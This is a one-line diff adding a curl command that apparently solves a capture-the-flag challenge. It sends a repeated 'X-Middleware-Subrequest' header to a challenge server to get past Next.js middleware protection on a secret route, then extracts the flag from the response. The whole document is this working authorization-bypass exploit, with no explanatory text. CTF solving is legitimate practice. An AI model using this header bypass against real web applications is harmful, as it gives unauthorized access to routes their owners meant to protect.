@@ -1,0 +1,1 @@
+curl -H 'X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware' https://swamp.challs.srdnlen.it/gingerbread-secret/ -L  2>/dev/null | grep -o 'srdnlen{[^}]*}' --color=never | head -n 1
